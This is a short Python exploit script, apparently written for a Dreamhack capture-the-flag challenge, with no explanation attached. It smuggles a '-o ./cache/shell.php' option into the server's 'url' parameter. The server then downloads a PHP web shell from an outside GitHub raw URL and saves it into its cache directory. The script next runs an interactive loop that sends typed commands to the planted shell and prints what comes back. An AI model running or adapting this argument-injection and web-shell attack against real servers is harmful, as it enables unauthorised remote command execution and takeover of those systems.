import requests
from bs4 import BeautifulSoup


if __name__ == "__main__":
    debug = {'http': 'http://localhost:8080'}
    url = "http://host3.dreamhack.games:23428"
    upshell = requests.get(url, proxies=debug, params={'url': 'https://raw.githubusercontent.com/update-source/shell/refs/heads/main/shell.php -o ./cache/shell.php'})
    while True:
        cmd = input("cmd: ")
        req = requests.get(url+'/cache/shell.php', {'cmd':cmd})
        print(BeautifulSoup(req.content, 'html.parser').find('pre'))
        
